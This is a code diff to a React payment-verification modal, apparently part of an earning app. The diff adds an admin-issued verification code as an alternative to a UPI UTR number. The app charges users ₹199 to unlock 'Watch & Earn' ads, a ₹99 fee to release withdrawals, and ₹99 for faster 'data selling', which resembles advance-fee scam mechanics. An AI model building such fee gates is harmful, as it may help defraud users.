@@ -9,7 +9,8 @@ import {
   Sparkles, 
   Lock, 
   Zap, 
-  Clock
+  Clock,
+  KeyRound
 } from 'lucide-react';
 import { DepositGatewayConfig } from '../types';
 
@@ -20,10 +21,11 @@ interface PaymentVerificationModalProps {
   onClose: () => void;
   type: PaymentVerificationType;
   depositConfig: DepositGatewayConfig;
-  onSubmitUtr: (amount: number, utr: string, type: PaymentVerificationType) => void;
+  onSubmitUtr: (amount: number, utr: string, type: PaymentVerificationType, verificationCode?: string) => void;
   userEmail: string;
   isPending?: boolean;
   pendingUtr?: string;
+  userVerificationCode?: string;
 }
 
 export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> = ({
@@ -35,8 +37,10 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
   userEmail,
   isPending = false,
   pendingUtr,
+  userVerificationCode,
 }) => {
   const [utrNumber, setUtrNumber] = useState('');
+  const [verificationCode, setVerificationCode] = useState('');
   const [copiedUpi, setCopiedUpi] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -52,17 +56,17 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
     amount = 199;
     title = '₹199 Video Ads Lifetime Unlock';
     badgeLabel = 'ADS ACTIVATION GATE';
-    description = 'Watch & Earn video ads feature unlock karne ke liye ₹199 ka payment karein aur 12-digit UTR submit karein.';
+    description = 'Watch & Earn video ads feature unlock karne ke liye ₹199 ka payment karein ya Admin dwara diya gaya Verification Code daalein.';
   } else if (type === 'WITHDRAWAL_99') {
     amount = 99;
     title = '₹99 Withdrawal Verification Fee';
     badgeLabel = 'PAYOUT SECURITY VERIFY';
-    description = 'Bank UPI payout verification aur automated server payout release ke liye ₹99 ka fee transfer karein aur 12-digit UTR submit karein.';
+    description = 'Bank UPI payout verification aur release ke liye ₹99 ka fee transfer karein ya Admin dwara diya gaya Verification Code daalein.';
   } else if (type === 'SPEED_TURBO_99') {
     amount = 99;
     title = '₹99 5G Turbo Fast Selling Mode';
     badgeLabel = '5G TURBO SPEED BOOST';
-    description = 'Data selling ko super fast 1000ms speed me bechne aur high-speed streaming unlock karne ke liye ₹99 ka payment karein aur UTR submit karein.';
+    description = 'Data selling ko super fast speed me bechne ke liye ₹99 payment karein ya Admin dwara diya gaya Verification Code daalein.';
   }
 
   const handleCopy = (text: string) => {
@@ -74,22 +78,31 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
   const handleCancel = () => {
     setErrorMsg(null);
     setUtrNumber('');
+    setVerificationCode('');
     onClose();
   };
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    const clean = utrNumber.trim();
-    if (!clean || clean.length < 6) {
+    const cleanUtr = utrNumber.trim();
+    const cleanCode = verificationCode.trim().toUpperCase();
+
+    if (!cleanUtr && !cleanCode) {
+      setErrorMsg('Kripya Admin dwara diya gaya Verification Code ya 12-digit UTR number darj karein.');
+      return;
+    }
+
+    if (cleanUtr && cleanUtr.length < 6 && !cleanCode) {
       setErrorMsg('Kripya valid 12-digit UPI / Bank UTR Reference number daalein.');
       return;
     }
+
     setErrorMsg(null);
     setIsSubmitting(true);
 
     setTimeout(() => {
       setIsSubmitting(false);
-      onSubmitUtr(amount, clean, type);
+      onSubmitUtr(amount, cleanUtr, type, cleanCode);
       onClose();
     }, 600);
   };
@@ -243,13 +256,44 @@ export const PaymentVerificationModal: React.FC<PaymentVerificationModalProps> =
               </div>
             )}
 
+            {/* Verification Code from Admin ("jaha jaha payment hai sir waha par verification code ka option add kar dijiye sir") */}
+            <div className="bg-slate-950/90 p-3 rounded-2xl border border-cyan-500/40 space-y-1.5 shadow-sm">
+              <div className="flex items-center justify-between">
+                <label className="text-xs font-bold text-cyan-300 flex items-center gap-1.5">
+                  <KeyRound className="w-3.5 h-3.5 text-cyan-400" />
+                  <span>Admin Verification Code (सत्यापन कोड)</span>
+                </label>
+                <span className="text-[10px] bg-cyan-500/20 text-cyan-300 font-bold px-2 py-0.5 rounded-full border border-cyan-500/30">
+                  Instant Unlock
+                </span>
+              </div>
+              <input
+                type="text"
+                value={verificationCode}
+                onChange={(e) => {
+                  setVerificationCode(e.target.value.toUpperCase());
+                  setErrorMsg(null);
+                }}
+                placeholder="Enter Code (e.g. DS-849201)"
+                className="w-full px-3.5 py-2.5 rounded-xl bg-slate-900 border border-slate-700 text-cyan-300 font-mono text-sm tracking-wider uppercase font-bold focus:outline-hidden focus:border-cyan-400 placeholder:text-slate-600"
+              />
+              <p className="text-[10px] text-slate-400 leading-snug">
+                🔑 Admin dwara aapki ID ke liye banaya gaya Verification Code yahan daalkar turant activate karein.
+              </p>
+            </div>
+
+            <div className="relative flex py-1 items-center">
+              <div className="flex-grow border-t border-slate-800"></div>
+              <span className="shrink-0 mx-2 text-[10px] uppercase font-bold text-slate-500">या फिर UPI UTR सबमिट करें</span>
+              <div className="flex-grow border-t border-slate-800"></div>
+            </div>
+
             <div>
               <label className="block text-xs font-semibold text-slate-300 mb-1">
                 Enter 12-Digit UPI Reference (UTR) Number
               </label>
               <input
                 type="text"
-                required
                 value={utrNumber}
                 onChange={(e) => {
                   setUtrNumber(e.target.value);
